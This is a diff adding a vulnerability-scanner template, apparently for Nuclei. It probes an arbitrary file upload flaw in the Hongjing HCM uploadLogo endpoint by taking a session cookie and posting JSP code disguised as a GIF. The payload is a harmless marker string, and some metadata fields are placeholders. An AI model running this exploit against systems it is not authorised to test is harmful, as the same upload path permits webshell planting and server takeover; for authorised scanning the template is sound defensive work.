@@ -1,0 +1,59 @@
+id: HJSOFT-HCM-qrcardmain-upload
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: 宏景人力资源信息管理系统uploadLogo存在任意文件上传漏洞，可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E5%AE%8F%E6%99%AFOA/%E5%AE%8F%E6%99%AF%E4%BA%BA%E5%8A%9B%E8%B5%84%E6%BA%90%E4%BF%A1%E6%81%AF%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FuploadLogo%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+http:
+  - raw:
+      - |+
+        GET /module/system/qrcard/mobilewrite/qrcardmain.jsp HTTP/1.1
+        Host: {{Hostname}}
+        accept: */*
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+
+      - |-
+        POST /sys/cms/uploadLogo.do?b_upload=upload&isClose=2&type=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
+        Cookie: {{JSESSIONID}}
+        Content-Type:multipart/form-data; boundary=----WebKitFormBoundaryfjKBvGWJbG07Z02r
+        Content-Length: 524
+
+        ------WebKitFormBoundaryfjKBvGWJbG07Z02r
+        Content-Disposition: form-data; name="path"
+
+
+        ------WebKitFormBoundaryfjKBvGWJbG07Z02r
+        Content-Disposition: form-data; name="lfType"
+
+        0
+        ------WebKitFormBoundaryfjKBvGWJbG07Z02r
+        Content-Disposition: form-data; name="logofile"; filename=""
+        Content-Type: image/gif
+
+        <%= "bttest1" %>
+        ------WebKitFormBoundaryfjKBvGWJbG07Z02r
+        Content-Disposition: form-data; name="twoFile"; filename=""
+        Content-Type: image/gif
+
+        <%= "bttest1" %>
+        ------WebKitFormBoundaryfjKBvGWJbG07Z02r--
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'pathvalue'
+    extractors:
+      - type: regex
+        name: JSESSIONID
+        internal: true
+        part: header_1
+        regex:
+          - 'JSESSIONID=([a-zA-Z0-9]+)'
